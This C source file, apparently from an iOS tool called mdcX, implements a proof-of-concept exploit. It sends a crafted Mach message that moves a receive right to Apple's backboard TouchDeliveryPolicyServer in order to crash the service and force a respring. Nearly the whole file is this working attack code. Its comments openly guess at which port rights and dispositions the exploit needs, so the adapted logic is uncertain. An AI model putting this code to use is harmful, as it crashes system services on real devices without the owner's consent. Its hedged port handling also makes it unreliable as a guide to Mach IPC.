//
//  respring_utils.c
//  mdcX
//
//  Created by 이지안 on 5/9/25.
//

//#include <Foundation/Foundation.h> // Only if using NSLog/ObjC features.
#include <stdio.h>
#include <string.h>
#include <mach/mach.h>

extern kern_return_t bootstrap_look_up(mach_port_t bp, const char* service_name, mach_port_t *sp);

struct xpc_w00t_msg_t {
  mach_msg_header_t hdr;
  mach_msg_body_t body;
  mach_msg_port_descriptor_t client_port;
  mach_msg_port_descriptor_t reply_port;
};

static mach_port_t get_send_once_right(mach_port_t recv_port) {
  mach_port_t send_once_port = MACH_PORT_NULL;
  mach_msg_type_name_t actual_type = 0;
  kern_return_t kr = mach_port_extract_right(mach_task_self(), recv_port, MACH_MSG_TYPE_MAKE_SEND_ONCE, &send_once_port, &actual_type);
  if (kr != KERN_SUCCESS) {
    // fprintf(stderr, "get_send_once_right: mach_port_extract_right failed: %s\n", mach_error_string(kr));
    return MACH_PORT_NULL;
  }
  return send_once_port;
}

static int xpc_crash_service(const char* service_name) {
    mach_port_t client_port = MACH_PORT_NULL;
    mach_port_t reply_port = MACH_PORT_NULL;
    mach_port_t service_port = MACH_PORT_NULL;
    kern_return_t kr;

    kr = bootstrap_look_up(bootstrap_port, service_name, &service_port);
    if (kr != KERN_SUCCESS || service_port == MACH_PORT_NULL) {
        // fprintf(stderr, "xpc_crash_service: bootstrap_look_up for %s failed: %s\n", service_name, mach_error_string(kr));
        return 1;
    }

    kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &client_port);
    if (kr != KERN_SUCCESS) { /*fprintf(stderr, "client_port allocation failed\n");*/ return 2; }

    mach_port_t so0 = get_send_once_right(client_port);
    // mach_port_t so1 = get_send_once_right(client_port); // If the exploit needs two distinct send-once rights to trigger
                                                       // The original PoC had this, but it might not always be necessary
                                                       // or could be part of what makes the crash specific.
                                                       // For simplicity, if only one is used in the message, the other isn't strictly needed
                                                       // unless the act of creating them matters. Let's assume the original PoC's structure is intentional.
                                                       // If so0 or so1 is MACH_PORT_NULL, should probably error out.
    if (so0 == MACH_PORT_NULL /*|| so1 == MACH_PORT_NULL*/) { /*fprintf(stderr, "send_once_right creation failed\n");*/ mach_port_deallocate(mach_task_self(), client_port); return 3; }

    kr = mach_port_insert_right(mach_task_self(), client_port, client_port, MACH_MSG_TYPE_MAKE_SEND);
    if (kr != KERN_SUCCESS) { /*fprintf(stderr, "client_port right insertion failed\n");*/ mach_port_deallocate(mach_task_self(), client_port); mach_port_deallocate(mach_task_self(), so0); /*mach_port_deallocate(mach_task_self(), so1);*/ return 4;}


    kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &reply_port);
    if (kr != KERN_SUCCESS) { /*fprintf(stderr, "reply_port allocation failed\n");*/ mach_port_deallocate(mach_task_self(), client_port); mach_port_deallocate(mach_task_self(), so0); /*mach_port_deallocate(mach_task_self(), so1);*/ return 5; }

    struct xpc_w00t_msg_t msg;
    memset(&msg, 0, sizeof(msg));
    msg.hdr.msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_COPY_SEND, 0, 0, MACH_MSGH_BITS_COMPLEX);
    msg.hdr.msgh_size = sizeof(msg);
    msg.hdr.msgh_remote_port = service_port;
    msg.hdr.msgh_id = 0x77303074; // 'w00t' as an integer, or some other ID

    msg.body.msgh_descriptor_count = 2;

    // Client port descriptor (could be so0 or client_port itself depending on exploit details)
    msg.client_port.name = client_port; // Or so0 if that's what the exploit sends
    msg.client_port.disposition = MACH_MSG_TYPE_MOVE_RECEIVE; // Or another disposition like MACH_MSG_TYPE_COPY_SEND for so0
    msg.client_port.type = MACH_MSG_PORT_DESCRIPTOR;

    // Reply port descriptor (often a newly created send right)
    msg.reply_port.name = reply_port; // Or so1, or another port
    msg.reply_port.disposition = MACH_MSG_TYPE_MAKE_SEND;
    msg.reply_port.type = MACH_MSG_PORT_DESCRIPTOR;

    kr = mach_msg(&msg.hdr, MACH_SEND_MSG | MACH_MSG_OPTION_NONE, msg.hdr.msgh_size, 0, MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);

    // Clean up allocated ports (send-once rights are consumed or become dead names after use)
    // If so0/so1 were actual send-once rights used in msg, they might not need dealloc here.
    // If they were just created and not sent, they need dealloc.
    // client_port and reply_port (receive rights) also need deallocation if not moved/consumed.
    // The original PoC deallocates so0, so1.
    if(so0 != MACH_PORT_NULL) mach_port_deallocate(mach_task_self(), so0);
    // if(so1 != MACH_PORT_NULL) mach_port_deallocate(mach_task_self(), so1);
    
    // If client_port's receive right was MOVED, we don't deallocate it here. If COPIED, we would.
    // Since we inserted a SEND right to client_port, we still "own" that send right.
    // The reply_port (receive right) was not sent, so deallocate it.
    mach_port_deallocate(mach_task_self(), reply_port);
    // If client_port's receive right was NOT moved, deallocate it.
    // Given MACH_MSG_TYPE_MOVE_RECEIVE was used for client_port in the msg, its receive right is gone.
    // We still have a send right to client_port, which could be deallocated if we don't need it.
    // For simplicity and matching common patterns, let's assume client_port's send right doesn't need immediate dealloc.
    // Or, if it was only for this transaction:
    // mach_port_deallocate(mach_task_self(), client_port); // This would deallocate the SEND right we inserted

    if (kr != KERN_SUCCESS) {
        // fprintf(stderr, "xpc_crash_service: mach_msg send failed for %s: %s\n", service_name, mach_error_string(kr));
        return 6;
    }

    // printf("xpc_crash_service: Message sent to %s\n", service_name);
    return 0;
}

int attempt_respring_via_xpc(void) {
    return xpc_crash_service("com.apple.backboard.TouchDeliveryPolicyServer");
}
